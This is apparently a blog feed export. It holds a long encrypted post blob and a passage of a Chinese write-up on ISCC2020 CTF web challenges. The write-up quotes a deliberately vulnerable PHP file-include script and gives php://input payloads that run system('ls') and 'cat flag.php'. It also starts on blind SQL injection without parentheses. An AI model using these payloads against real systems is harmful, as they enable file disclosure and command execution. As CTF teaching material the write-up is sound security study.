c973ed51586507e4fcbd6cf84675f3f92169149dcf86a1d0e02595f5ff17b8fe9a38c2c55fa778377c815b8dde206b3526c6cf3ac288c7facf16a761435f505b5fdf12758d99d9f1632d58cef9227b0b3131fceda65a00d92e26502db29e2c2b66298868e92d1493b6d5bacd0798adbf7e18b693a22b5aebbaba1ddd6d2224c85df2afae830aeb039effea7fa341143ec841ffc9bc3818375e73fd37cd8618fade9707b1a29704996b0c83ac0377cd8f882d02d69dcd0425d493800cc7cd9959dbc7af9caab43fab170e92fb9f49f74ef66ed04097d195fb703da16641a4bdad3e05c61c8c62b7375f62836e5c77d0d9e8276f317b731c58f32ee7c46478bbe1e8434977aef84a862aa99a1821fe1686fa1848e68fc06a59bf5aa6c640823d06830c732dc0ec3d9437d00cce717454e4086cd9411cc9cb0e0c674308e5ca518f7143d37e7a4c477a6223ebbeec830e7a127f65273d44cfb3e091deb619480c735e91996fb2eb8fc269127a17ebd59283d2d45e863a72bbc24bc1d301dfb2f547396fe47717a88a45ebea7bc1d120a252aed8cd9d9d3da113d897f4c4b1ae9d5e0f915eae6fee69096f2d80bba9b8ddc4a5774fbc311b8d2b67d5b9907f4dd520824fb0feea94319977b31a83a9524cc4f1348b4ec2c02653a5c3fc70200488c0cdceb3e1bb4935543ef6badafcc6a7a6d2dbbd25de6999d1d6f0580caa30c5c6bcff2371ffb5fa58d61404f190ce60b479f6c19bbb49f575fec0d8342b7deb2d5e6d4da28dd999609d8bad66206aded65c81d38c62338b2f1d4a3046090d856db988d08bfbeaf92ab0530ca12462d7d807ae22f19ce902b715780c2850d5b950ec1c1d5f39d2f7480b22cc3ed395fc6d8e9fc3d8237926902d9e5cf06e2b6114474d8a79f1a5582def96cdf5c71720e877f48f41813410ccee81d2cb5c78b32a182a8167e517ee8bf4c24b1e784d398471e7b8958f91e7df342249b745437419695f3c65cfa83fc55cd83cf4cb788afd195095553d60ac4d9f3e49ff24f777e9db39d406ae67db6aa2ee40416ebe11336af398583c482130352844da211c56511e88627fd43b836b627e0ed2147898430cff699b8aedfa69b551b416b1024e11d00b108c141f2a30aa99b6d52454fba0f20ab4ce850b2a701c3c42db6eb5e2fe408497b2b87484131c34cfc56d8e28ed07d0f4d99949d1a57df423d226d0d73626f8a9ad79dada7712b63bb378f1e104495f2e4f3344c867ee3ebd2a6ae7abd7cd01b5551780c3609a321d6a44a481239b0d01318987f86d584c79abfd35d2c189f26910bb51e712a9df8c3d3ef8ed2f3c010be9e2a987fc36a0dbd1a37f51db157d3ea84cb2403dca9ec6ff1e7a2f231aef0536d58aeff8987ff067afc82cbc8275e050cca5373cffab7fd9e070087414349fa93c9d38aa78a0baaf6c00994888e42dc321c68a45e3cc2fa66be4e5cf1ee669d40a15124dc70fbd3e53b60caf9413ead29034bd2e0222ef2992b9edd4d14faff482c9e620b0397bbd164629ef9572563a6e5bff1cc8a057355726743197537703f6eb68cef99b1ded846e9d856aeff458a405a52f76989aed321d668a7958a9f28df5bf3f5bfd0239ec660df307bdb01a0610b9b38e2952057b0fb7f3f8e7feeb781824ce8229f5c323173c2a05b79d2c3de1ff31b8913135a149220a41b76b3521865e1173002bd00ba98124ecdd0750c5d39069fa732f387a45651834bccb0bec8a4fb2996deffb85a8d986fe41dc95991ca8343b94ce6612a981165bfa043658e138a2961f227a3ee9fe880d3422ae225de5596eb9cec02b5ebeb9aa4981b66102086f412cf1cde75e1e38f0eabcc893ad97e6f11124872913e684bab0c70c5292460528b10893eb4ad765b2bbd4441d163ee12801e48a6efe11224498ad525d9cc9cc30f9409d8442922650c1f403fa5145c8e9233f7ccf29cf4173133d95c8f83f1b2e99ef365f498a9de00891d9739750d9f795cc9b8c305b14e875fd581b055e6a8e00d224de3b44d2dffbf47c62f59c9848af6c366b065b9f887c2be270eb752508c326c617e53f9e8eaceef4cfd7b57c9a22cf42171adc025a1c4d3794c61541157974a95246a7b74c505f45b6e1f7068b8e4a0cf3f037547cd49aa47b6949b2a100b526e487f126b23b1680653d32365b9aef319c8b6d41ef58e86456a4f78ed4cfcb4f992444ec6b3f89eaf9c299e7dc89b6c112303457ecae912f23ea1705459a9016372984521450ef3f8cda260dec447d6f72d26e4dca1f057bd9ee1498d882184190840058bb80855c1f4bbfcadbde118319a51d74927b14db5712bc7b56ef320de22f8217a783e0db90827e4f4efb02fad29a6f485bf62c3d9a0ab17d2c119d45212713481b0e551f48f58f50e614f12d27629c2f0fbfd0d5970f6bc063744e19a13167259ab7d5bd7617f9ab4e7fc9d49e1b93edd94b9717c5ecde9a618865b9623cbdf0796056d672d2e76457dcc470734e4b3807565fa7ac4e9ed34987a82f25840e9bd33a9e245e1b60fa87ee2c4098e36ee04ce8b0c317ee3d442ed3493624961429ec587d2875d09dfb0efedad15dbee29bdde217d7af1406475203e17d31a667e409f54c016186307064d2756ae2d986411864440073d321b9c31ba742f57cbc9107789313da6befd15e4b8ea31fbb98aebbc72941e505537103a87434946aa76c048e50977d528dfd7fe913fe2613239bffd03ea5137fd661dd9cbe8c4193473dc80d61f3e7ab7259ab0df353a45894aa3eb11c86703aeb0ba3af9b19dbec4e9660e317fef08c8c23f8cda211e1f76004fbdffc70ba3fa6fa0cc1b1fcbe37d34cef66e9384a0bd5efdad23b6933fcfb05fcfbd7278696856aa6bbdc63b66c10a677e52f0e64056c753ef796e91bcb25b4a7c85db6f5cab0fc8b6c1df16428f7c371087fdaa0354882181715b4ec3c04779b5b9830b354f584c522a6e2b349e1fd3bbf56c5b22edfaaf0acb83657e1917be0d56dae42986d63c92a34ed57aeae27b49168f248ba66c38c82ff0e7c469be4b15aa5decef38c1ddecf1951e3e04b7d6e11e64043ca0af7266a9dbd262a12f387a15150c59a2a66436cdb523c67efdcb616509391600489f43adab0412435ddd27bfcbded6b2ce571abaeb3a30c164b51d2a11146e4dbfb7ac1c3aec5656d819b41b9602ed0c8ef7c8d7cf3c7d16b5ebae053390f5d5de443f4965f6c0835dec0378f76a438898d7e4bc315f8b19caf06204ceb40bd9e40c48e3246b526a2a8662f15fedc301d58dec3160be164a1a0ae812472b78f8a90482ead20d5c406278b565a43a0a9c0e36570796f467361e00d59f25c42dca453408c56012fdd6b2995684b44030a039c94520b3a7f04e65674a21d5fe0fb3cdf7c72140bda6a7d2578ac62db0fede5fbb27c8473c3bf1ee1e8f5cff5e95c2380cf8064622c0896819832bfb44c7d37551fae14380aad0ed93cf85504bfe46ef2b565f8a97acbd2da389afdc47a41b116aaf270a175e70eac1d71a0977fa05c95f3b8905d7dea843256757f536c680a64bc7fceba67cc5595c67907c5b82083ae8eca84f55bbc16f75c0f3c0b966c821eef3a1b40a4a82a06da4f3a8869c7ba273479570721c6e3a67a61daba1a97ee2d55c9b4122db6c2ce6dc8d2b19772b6972d8b205b36b9271d923af4d3ed37cb427394ae8bdbf7a43b2b12cb3ead29dfa44efd4f3238a4dd2abbfd2e3cf826a702223825343e3c2a412597c3d6126fc9ecb2422732f5c8847bddb03963a21edee7b888aa2c59b9d22ebf195572b0f2e862ca8c34b5c4cf2e80918496965a7de883dbffc446d07178b6ec33ed5b3ce63c6d7084400616ca992a500b96af558f16aaded970566468d5b7badbad103804101f7ce19c8a58b9fc5ff8fa159af420e8b954cfbacb647a47696d60c2cc0ed57eabff4e626f4fe363a4dedb013cd521a0a34054934ee7b6ef733c9691af5d05f9765281d1b99eee18f0f6518cd8a06e5fe9ed48097dae2e360b02d5790e37bfe562230d0dbe4e096aefb14c64fa13161f63895b77df60edd4e55c0bf8bb9ceb417ea4742dc3976462c08b562538ddc620a978e30431f2bb05a6f3cd6d98c3582d9be4460070e51300ad3a52f2c139129847c67bf402047c2f74ba130bf1606ff54f0887610bd277ffcac12530579c3d2c451919e6815727ec8e0d5af6605faaf2adbd0d89be029de8c74c85e1656729f81a42f86c72f758ef9ca93fe981cab1bf08a9f0c103061ebae3ad32c5b6201184c10fd13c4e13e6aa4def7322a0d6a5c279e14232bb6f00969b7363ed07ec60dc2d2963878cb1cce7535c3c875a62f854474dacf60a5ba54fe5728dc4ad5ecd9f6773ea33b23711a0506cfa7bebfde6ee2b1cd515d276cf0d99aba860dc3ca082c008b3a85e26f1dc890ef73f1b1b59793f53e94046db5a337e0dd1aef586ffa59dbd2942f49217d6a88f632aa7f43ca15c47242ae25ed10c65366ba7547c2be135369b618cea1b14f6b01a4ec183c641e71db06b711ea771a7e05b62494412ed9c657d7fb5bb2398a1020362d5d681ca125691a0782175c43ff62714984165ed180701b448a9be2adb227227018d55e7cd17f4ac654c336cc8cffdff7013e95c59d191c3bec7dab2c3cf18da763fe8016837eb163d5c37b5636d4da0c9713d865c13e74c9bc6e2433fcb9317c170ac8cec22a8cb033adaea33f8ee0f4f66d3822c8929e6e7e9590234af55f67ce9492cf056739838c5a2a2ebbb0a0c6ad12b3ffebe8b87acd2e4030d92b5552615375d01d20dfb16ae72b9b80a8330bbb03a00f1fcea22fc74a32a1878a7af073c6ccedd60dfa1fc6f9b6ec4346f4d602e326606346639a05a04c918aa6bd34fbf147166cc6028ebbaad6fd00427f1664be26b8365470dcb5955a6c3b0f788190177f0e9cb0e54fc0091496cda1f2151e8fa979e6255d1c262828e7af0051047e7fc08b753a48474d554de16769a9121f41977914e99377597d5ff76e8c0ba6d39dce2743a20d1d189229f9caacf9c3f53f7e0c82e57785500965b1ddfa91b2382c34663ee3e309937526d2b28fac4d6bfe47258191fb516e32d966a01f86b1238e2c04a7c0c3380ae18b16fd9e9f83d6319cdd6527f740c1201aa2e045021055f062ab1bf77f0500fe8f4b34de899d0a1c5ec4e10b96ee2ffac6e2b0962b746a475ddfa4d5c5b1f818487095e0f1f6f6e0fce488c8e09a1a2e5b3c6ec7ec8261ab138e48f490457db1f3701bf359bcfd27f11a0f855e0fa49cd99224ea934e7933540a15b40d907c135404f5822012ba8d4a9f5f3290778c5b79683308efd5594f5facddbac5c51a3ef137c20a94bd211949d04c0fa3c2b2dfc0a9c00a3702b1e67187138d9a09aaa17351920269659d76af0d53c45d420e6f1b2c51e3c7a26a9f828b19d6ef845061b0917137cb38eeb0472f973ca053e9f6743189084da6c0e8069a6ae924bd0d3f8fd7dd47dcc64db8bd39f710689acf9f6f90b394e43b603e4bb839eb3ff06fbee5bc0aad0976961f7657691811c65a42c0cac0cd6619ba934c9ea88895a3e5c10a717978401f66d4a8d39a3cd84b711f911f4683c6f9d28595b838d5b15fd7922faa9bbd9257e3624d90c8473403ba4c884fad8cad750606e22cb8615788c07598e3f6c841cdfa7d3c8a831d161f4519624b48ed4994685c43fbd0c8e8dd8fbcbe9bf32c0b88bdc25efb1f0cb46d350d1c59fb906bf67f8f6f44042c91fec27c070990920f1f946839c8f546ad85615ba3da0a3bc2f1ccb4a88c18130ad4686e90edc9a171f2a719717f6932a837c06f7509c65fff617c27f0a09376bd63a2131f1b7d710070d1a1af901037c85b2104a1ae0835c2e76ad0a6249f1b74eaed6b1c8b182f673d8a323ff11adb88349afad9fd429536ef8e7dd59fbbb007bcf92337331a504992595a0e347668bacb9e4e570e858e6d87c47c3529df0a8e5310f7fe36b4df8c0d1548fe044cf0ebda5c217fd6cb7bae527e2c77ac5d4485da5225e572c543030c786348ccd05b3e8fa9fe59f217f60595f1df9a2d944fe9cccd3aa8faba29aec7c500d2841dda3d00d4e899ecba487a4aa2c65a904cca77928c3de72f6ff150faa8feb7df05b5795e866fef2c09f6347c158ffe78d777df9527d3957910d1f1fd10245bfa84b8f7b0907083138a948642d448552121b22b6d958318ce4d3693ab661b79c780918bab5c0d17e5aea4d93e909e99778528121a405a6cd834f693cdf29459245cbd5260fbdd710fe5a2399063df5ab84ad1b7d9b1d062a17c1c07d8b84d0f72959f823dbd8c7124128e918b6fbea6ed8f64e3f1b4d8657d69e7844bfcd660aa4b1bd8143c47a007b1a2e601dcf6a4533a52e1aa19abccc9a226d3ee7cd1baee109a657ccc8e29f400a3d28e2ec28df63b3bfcf86391933c5645dfd38e1d9ce3a3d8bb42d1c57d9e7ca1223caf96bc2eb2f3fd79801c89d2e758e82616794a5915bcc754dbc56cf028733ee248d0f21ca2aa7ed9f7612041c4ae92249f7141cd12caa4f471524d3b692f19eb13fb6f9d3b77600829fbcb863bf0b5db66e03474f8c11fecd6057c25caa69aa24bdb263dfa4365b7c405c3a047f9bb97f464e7cb5fdd7cf3cf9b534667b58e062a5311510ea0d375229cf5a65273c0ffdfaf0586c5ec257e1dd9bfc594b57b94b88f27868390cccd6a862bb89246ba45c8e1cd61860685ac0afdc13c62f02376785c2e14c25aa3e956bd2c0e7bf3ee546461f8764ab5fb0d830fc3086ba645fb36f9cf2e6eb662fe9f255f6b37d4a1f77c3ee2267d5920459054b56bbeb2c64609000433b712108744718eb031e25f055d35ecffcc2594fc4028d7c371a0de92f5ed504819e3f1ebfbab933365b03df0d4903ea59544010460fbd771f899b3235d375c4afd0ed76a0c3f475c2b52b29428ae97496f68851378a8396651b0ea287fbab9a0b0ca50f27241413da03b4c12462fcae5ce870ea1515f94232384657bead6b519f74a2246603e227e83b96cac777654743eb06c5332edf93c0d5f3f706df50d447382ec2c7b32ea88f756ccdc7e38686ca9d964df05bff3791caa866400bdf7f6e52b9ada9a01b5c93e443addbf3066b5560ef103a8a657e788492bd34ce8fc9c9d9c9eb8291a34526a3c30e4bb88b2238633560a3c3f450dde0e25bfc82c081d69f9ba425167dafe981354fb8b3cf74a26ab0ce3168c70d1a06423b8fdb8dafd80070bf12aeae2479d2573d91d2ee44e1f61e33ef20d9b4796ea2e21eb8e7bbf43a89ebb63ddebcc4d2fb1f06d6e2bdaf77d94baa93194e2fc33cd7c7a8608f972e50394e606e06f76b958d94be953545e7372099526ba903bb41e8a044591798bcde33901257eed3e1bab43e013f23f0c6c05135d6997a75e5e7877216b65f13605406e2f5dc46d8428230ab744d73a0c19390d3a21fce49c7ea013fd43a72a3460b07d14ce387c809417da231b6b59ecc7075bcd3c8cc4b0e19956d67b996e1ecb109a25931ae1d7157487a1e90ad0d36e91c1f18f0651c9e6befa9a440b4b0123692ecbb0d9abacae19c76512ccd183ed445edaa7ed0e5ec77d2c2bc221a5b70472cae8edd48f0a75eee355fafe04adfccd6d0578f2deb4c2dcb13889ad34823af704a2008ca8ca017e9f99aecb8c84dc3938102a76072eee0626b0905e3cb8344a07cab7a51c0539bba788a70b6d01fc999bb202fa607a9b58c5d6b56c03d99b55e229926fd99c3258b257a0225561b44be3ebfbdc31c19c9ecd611866e1935b9e763a1f099c9ab567e349b5d81aa8998d0b97f43576f772a3f3c4db2df3eacb5dee5559c513b719a3d3729208f7475cc0451f56cf44450c31ec008bda65c72a3af61f077c19782f3a7896c0b9a708e297084461716754bd0213adcb5de7e11a96d72f282283a040fa87af483ad7fd87b0f9a81f9e36402693db605d7ea76a21531cf209750e98446cd9aa2604431648c8b1ec19fe5a399cb2a97af055069465124d21caaa6721dd6849bdcdc5e05cacb8eba05097ae27b122246b5890d9b9256cb939972392c0817ad2e78b8a9295abc13aba37ec8cce7b817adc9fd3ff3662e7f51e9c936086415c7cb52564f47e53fec4bee1c92a5b01e51cf84b130dab8c3b87b1f5e102d9922b22dd51ff628fd4a4b21edbc8e9621a5fa7557f150a0c027fe0c9399034b14813673b6764e1e5ee3f592b03884fb6c9335bd3da2639f815d37fbe71a7175e3bb3d717da20adb17b283de5e6a6dac7fc917435c3a80906f6c4b04146e5477c1c60cb5984ed287b3039c00bc6f59d1191102c9a5465da2f8e0d72a8e9c096c452e82fa84b92b4f253bc4dab78fef6a10d3701d275f3f3c633e0b8fbf7d6e57bcf0573350511705500a486446e6e950eea8ff2cae5515ae9587c045b1de681e0f2ec105f124eee0774326f0ff98ec12bf10da4cc17330451600feffccf14e38fbdf4ee3c2ed6cd7674afd147c4988c4c99511ace525ab7d0a53a717cf3d684bc70665a8544fac37b80b820290539850e31f3d58ca2f65f5fe33e52301f16195c32f349e49b815a90967313b68e1c6d7990b746e054e920f874fb927b0b0bad187ad88e79235802337a6617dd4edf5449bef6138856572365cc5cbb222f6cb7d24e2e4ff3c13e88d2ef371858b9d55af3b9cc00f79e1b365a56cc730f105e5a4682e77e749205cb9646d815c1af54c7dd19e86923319c49c7d05186c86cd82a8939d1f93cd034f10f7db25364f8617cf8a8074750c21d8f6722f9e288d38ca5e28fe58f7f3ec77d0d9ef4a7241593debb057a2dc6b6504f58070e961c22d115dc52d2dee83518b51b680987360e7bb65677f3ea77739448367932e2fcd656e0691ba951177b54ce75025cd303c63457299f8cb71cd08679eaa9f1d3f417160508173ffb250320ff2ed9daa866defce7fadb8601bceafb4e6fc2f4452bf7616bb07ade268bc456fd01363a51332cc82cc438db3dd579d64312fbb9285f4e16fd6a856a0684d2a258b9666a48866cfef9d1d662520155d9555f8c858064fc2a40993585c83c5cfbcb8d27bcb8e81bd349cc77084afc51a1ac2b348e67eb9afa8ef051c1224d08598ec8c6a125aee32088026a3114c538a61ef4702bca6432e97887d827687c551464f81e6af623080f0c12f86772b4e69e95f59a55483c47598880acea41fe0f015103715e2d16d20095715fdb45d7eb5aa9733ca4adf55a5363748049551c0d784e8c807066cd47c7c082b3b300505af25cdabc6efe2771a7bb0a30d3e727e1571975eee56c5e497b2cf7fbb7799de31840c753295432fc676ef8d7cd40ab26c1bd5c297df25ac2e2029cf6b63980782bda6795af044d4864199aa33c0207616e93d7899fb413d7ade25f5f7a667d92d4d881b821553b8e3bad3b9067c77d72769f63d7e0da7f6fac92f7a363830988a18a5244433ac6daab7b658c691b09beb60b82a12e65e2df57c8579338bf31c19ae21e72f07f3c4c3bee2e764fc2690ea9682088f37202cccea02b3fd0983e08754c63a3517ee725ba4ee5a8968fade4a5653af89f6a3535731c9f031ec5a8ad5bcc0ee81330a1444acf98aa83c4a4fcc3d9673fbf95bfc230c9ac878e126e6e4864f02742734172e482b37df8b76125f1fe1652d80377c9ba101297d50d3fa5107b61289acdb1ccf2e677feb4de3ac06ff772fa6785e621c550eb65e061fee119c7d6c2e44cddbae099c0a77b3421cea529b3cce44f9692936a396379a4a3ffd050c35567b3e092e62c3effcf9965f5b165d604a1f9a094d5fc7af0c5308c73fb007d4a7e1941237b5ea2319bef4b031cafe9cefc6932d3d251c8d4452394c19ad1af8a6c205520a8b926da1ed3c3c7825dfce4fc3023c962cb1939b4478e942b6a6e5ae8c93184629064cda775460e796492c6e0a332aaaac091b2e0114de66c46e96abc036312ef9a25067b08397260e32ab01b59f956bcc2658adb49dd15ae34b1d43795927664815d4a21d4a1c2328e1d4219627ec05dda8ff06bf9130744a8070e8cf1c4b22cbce6945f54a9cdc6b202a06586daa1a45938a4a29011c7b7ea0377f3b3f2280016e3d7f0db233e05a5f914c2f85a72df20a13e81ee92fd6b01f1eb7af545a3f9fac69dede2ea787b7c63a8e68d4fe2ec3c626d18794900d970604077823999b92135ed1374dd9f8359966b3637716ab1875290cf85a067e5761b5723350e24fe9d88ec29875907a84bd007274887dbd848032ae9d96c16c99a6f0b40058936b1b12588b4b72eb98f821583c33152199bf6f8a483b43c4e2f3b232fd3c5ed9f4cd4207392a15fa7b63d3e0ee1cd7f675d24623543152b9f33da1c23fa969ddd4aa0801120b4a75301e190b6efd7066a47d3984f29ea6f96675de64fc64eee0d0355229d4aa4b3e4250fbfc0ed4dbbadd25f5e9b448f18f20952e6d8a955e4db1f6a0870c37ab1f7cfaa5d876db0af84f43d79120bb8dafcfaed23668c93de6b926bba8ad87e0863b7c0d47571b7b88e0dd6e2fc473ce62a50a37baff70581ac1743dd46470101633041e1ea91099f2b94b6b947c4c78340f39daa30aadb95cce867b68b865626432e04a15bc1c41fa4a995b57b512be9956c5b21dd312f6eb0592b82d3368a1ab3b012c9a369403925f7be7b06853074397c543b199ec5b3b2a683d7fd32b5700a0e0c34cb1f3e157c5e3eef6676711611dcb5c74869c3ad9f2284306e4e81fb3615c07d1a5b882d954dc887785869e2ebd27921c787081df2264587ffd1d3d5c865bcb82ccb638273c56c22e6aaeb27edcf7ea31aa51f82ab43ca11adf384c9114b4b3083eb867d230645aeee400381f2825229d0014abbd74d672c4460ac3f9f63d096a3eee4dd2d3e9e610e82998bc34798f48c5f60239c915a7a56e7d9556897a85b33baa65d7a0fa38fdd04b0c6f352635a928c1358ea3822febf3f686f145e738064c2b0d089af99f790d84ca4bd95fa7904a3d88ac66fa2ad265000f77a06e7b73ddb8b3cf0091078252a8c520946f3825a267315d69d9977437ae77a5a5805969751c6f4d22d1c34e037a8cc5e9b3de2fd3493b450199a8b7cbb53c508c0982b2d602cdd20d96c1710a4758952640627bbf80169c4832e5ad255831410f7c59f93d081ca05ca759aacad171bdcf0b3bc14dcabd3955bb5b0edde231cbc2ce87e8f56ebf9e523f5429618eff4ac289735b89375a393d0bbe7c4a48df4d1314898d1095fafc347a987cf2fd3a37647f04b55a2f584d4c33b37f404296f9a576348df0a9df7a8ddbb9de9556ade811ace9aa7672fd8080e3ede1050750c0e2b77b38a17fb0191ccf0497bb8d0d463136e8efac55255bda1dfde7d61340a661b485c2b631bc72beb89522430d262056ef63676ed91a0939f155e3388f695aa8d3772a26b17baa5d4aba14435b25da337b498461389c08d40a51b225782fdcd2e270ee7b4cb1a3911bf1533675ec2d9942c604e2ce51953702ab02910b2fbb64921789441711dff94773a49b6d78d57d541fe78200321ad3eeceac2cf5efcd0bd2b391ff5ebbe53bb22e90a7add9b41cb162dfb98d5ffc5560d235946bb4bf9aa3c2c5238cc78452c73074aec5abecb4a010becd281d79b3a04a32d1c4dd415b8d02e04d225afc9369a6bf69fd3dd8a4ac7c2ef3b838fa54bf77136f40fb1d18ed294d6d44eb4f24756fb3f119c0034d41be5b1eb8bb8e0a2a14348d46aefa423d76e111d433e41a2d4578455a357e98f0bc55d9c20e892df0d7ab90e8ee3f35e4c3c5d1179e99fb828e3ba8992ce8ad3371013f73fd00f68cf7a4503a1fe5aca7ef44dade0232dd82063b91237a2405128eabc77d5046f614f546e08b0f5b0ac61796eaddc29edb43dea19175705ddc4180085832a6c4d0672477b626f6032127432d647da25328abf7e17e0ca725506c80f26e1e2f8c2a64fc5d83a648298f7bc204e1f8b04c000ad0c1de3ba15560efc02e115b2969a18aa238f14d28edad01aae188eb932de16f16514d4c4ed295eb452c9bf6393e676df2f6f03e6a1c63ba000e7cd4b08248df8043dbe58eedb364a9975dd3270d9bd8098f8f198323102892c4e0035fd6697b2265f380aa592d078d633746a0fe11ec4984b03c2ffaf416ea7e84c8cd18ca6772107fb9befac20cf1b7c710b5c3827d29235b429c9b32caa1e1ee4d88e804b2aa519b87e504bd09c51768ec3f412e5e750c93bccd62c02a20ab9d6d2cc1d3fcd3a487a67b3eefe4207a4340599d07e7aaa6f390645c157778dd22346762a06407e23fa8fce920b1b651cdc90e6d1f48427c6e13429195f76a45fe5db84697211cc2e2296a72afd5fb130eeafaf4fcd7a2ceba61a081a78b4648712afe656a2d52127ee3a6ae8655460cfe0a55b8642feac7560c89774a44fbc618945ec72b25913d4821bcc22ca553c90ad376133707e2cda4dd8eb14e62b6b3a3625d42e8023c8285819df9713c138cae1b2859c539d87e688fe320a7c3622ccbb83163cebf08e174d56fbfb1b7bdabbe10e67f07f92eac12cd3a601e47a86921b9b5c090bc01dec14619f88d25c569680fb14218f126e17734d9efa563c67738b15e273ed70f2531c6a42fbacb660eb4717faa46672d8ac4255494509c768baf34e9d5b4edb31def5b209107c268a2d1696ef561f70814088123ecde7305f42dcf6f023a1b383014d239c395c892cbb99b22bb97258405ecbe3eb5568b5fdeedf57e4fd570cfc93986567292d531569b789eb33e57114c137ec80388836c194f8f78f24b9ccbb2f6e37f58fd1d3415d38d234a346d68b4bfa29180a087639fc54dba2c58a8750928a7f510eca800bb6b1e3c742c2c43cf19a3ea0469ac81253c5f810856871f3b08cc9d7caddc3a4b29d637cbbe40524ec77c1e2300fc82fbbae5ecae39aab39e4ce628e7c397dadb3f1de5f33a47e14096edf5654ea3f7a75dcb7cd4f92071445b35552694e833f753422ad34d9299fde2c35979cd11368b51453d665cf17a33ce880aac5401bae4b48557ca26c9d7c5bbd031b409cc2a411bac49be4adda04c8d0c3dbe281c05b488bea5d4585ebf69c79bf1c1456ac1d70650efd18d14355b487f2ea508633d6a4630fbe4cc2dc5a3dd722eb730ef6df7d9e8ed4092b8b20aafe336ac55df0550b1ee6db5fa12777fdfd00f5d618dbdca1748a1edb1f707dbe4ebc38309faad5038ded0e5bd7fc76a5e16a82d3d4912feaa90c99f3f64de1c2c599b4d15bbc897f8eb52fae3442eb40aafcab8aaa4020ca3e90fac57c7370f764f91c5846df50a2c236d6a39a551a15765961fe6f02dc7b652c4faeeeb91aee06be107a503ff73b0ee5f9aedc664c916cc50d8ac0642700d712527fa9f2979806daff79d078931bcbfd90532a1aaa6587ef22d06b2ae40bfec55195c63fad2c28e6a0c850dd512633439243e63116643561d94f4ff5baa827307305db79f52a982b5a052ec14238a860e7cb717afeeaefd10ab45eee4096e4db676901a70ea0b9606636095f0347ba204c6d879ab48913462c3b16fd701d4eec6fa9690e565cf5205261f03274c2da783c6df80cee0364bb630f48046d2fa275618cf03854b0fb5481534477a234079117c1358e48a49561195ee54d3a905b80d9757836095a7c45530ff92bf919125c36a96c2865ca11416d963edb0ca1ce9a1f686ccfc38fc02f03d64add53d0b20462b9955454c651218eaba4a0ccc0e2e194d7756b1c65bdc13ba28066a449dfa23241ad232bffaf7d62a0a38141291d386920aa2207e10c5e894ca9a57c1bd1678c541fec8f3547414cee53eaf4f92102d77114698b2003220</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2020练武题Web总结</title>
      <link href="/2020/06/03/ISCC2020%E7%BB%83%E6%AD%A6%E9%A2%98Web%E6%80%BB%E7%BB%93/"/>
      <url>/2020/06/03/ISCC2020%E7%BB%83%E6%AD%A6%E9%A2%98Web%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接下来，继续总结练武题的Web题</p><h3 id="Web1：Where-is-file"><a href="#Web1：Where-is-file" class="headerlink" title="Web1：Where is file?"></a>Web1：Where is file?</h3><p><strong>题目难度：简单</strong><br><strong>考察：伪协议</strong><br>打开题目，发现以下内容：</p><pre><code class="php">&lt;?phpshow_source(__FILE__);echo $_GET[&#39;hello&#39;];$file=$_GET[&#39;file&#39;];while (strstr($file, &quot;file://&quot;)) {    $file=str_replace(&quot;file://&quot;, &quot;&quot;, $file);}include($file);?&gt;</code></pre><p>发现很基础，使用伪协议(根据源码，不能使用file协议)读取flag内容：<br><strong>php://filter</strong><br><img src="http://img-blog.csdnimg.cn/20200511160925381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>php://input</strong> </p><pre><code class="php">?file=php://inputpost: &lt;?php system(&#39;ls&#39;); ?&gt; //列目录post: &lt;?php system(&#39;cat flag.php&#39;); ?&gt; //查看flag.php内容，但执行后要查看源代码才能看到</code></pre><p><img src="http://img-blog.csdnimg.cn/20200511161213272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>等等其他伪协议。使用一个即可。(不过由于题目某些原因(可能是改题了)总结的时候，不能用<code>php://input</code>了)</p><h3 id="Web2：阿森的爱情-1"><a href="#Web2：阿森的爱情-1" class="headerlink" title="Web2：阿森的爱情-1"></a>Web2：阿森的爱情-1</h3><p><strong>题目难度：简单</strong><br><strong>考察：目录扫描</strong><br><img src="http://img-blog.csdnimg.cn/2020051116260172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_cXd6Zg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>dirsearch直接扫，在readme.txt中发现flag<br>题应该中途改题了，写总结时，扫不出来了，并且直接访问readme.txt，也没flag</p><h3 id="Web3：寻找小明-2"><a href="#Web3：寻找小明-2" class="headerlink" title="Web3：寻找小明-2"></a>Web3：寻找小明-2</h3><p><strong>考察：脑洞</strong><br>小明丢了2333.。。。。找遍了寻找小明-1也没找到线索。。。并且是0解题。</p><h3 id="Web4：阿森的爱情-2"><a href="#Web4：阿森的爱情-2" class="headerlink" title="Web4：阿森的爱情-2"></a>Web4：阿森的爱情-2</h3><p><strong>题目难度：普通</strong><br><strong>考察：过滤括号<code>()</code>的SQL盲注</strong><br>fuzz一下，发现过滤了括号<code>()</code><br>这个是过滤括号<code>()</code>的SQL注入，在做某入群题时遇到过(虽然某入群题最终考察的不是这个)<br>并且当时还搜到了一篇博客：<a href="http://blog.csdn.net/nzjdsds/article/details/81879181" target="_blank" rel="noopener">CTF中过滤括号的盲注题小记</a><br>这个题应该就是改博客里的那道题得到的。</p><h4 id="过滤括号的盲注"><a href="#过滤括号的盲注" class="headerlink" title="过滤括号的盲注"></a>过滤括号的盲注</h4><p>这里先本地搭建环境，简单理解并测试一下这个知识点：<br>测试数据:</p><pre><code class="sql">+----+----------+----------------------------------+| Id | username | password                         |+----+----------+----------------------------------+|  1 | admin    | bfe42ac26e273ef3a859a651e0a02df0 |+----+----------+----------------------------------+</code></pre><p>由于这道题显示的是第二列内容，于是可以通过使用<code>order by</code>操作第三列同时改变联合查询第三列的值，来判断网站数据库表中第三列下的数据。</p><pre><code class="sql">select * from test.test0 union select 1,2,&#39;c&#39; order by 3,2;</code></pre><p><code>order by 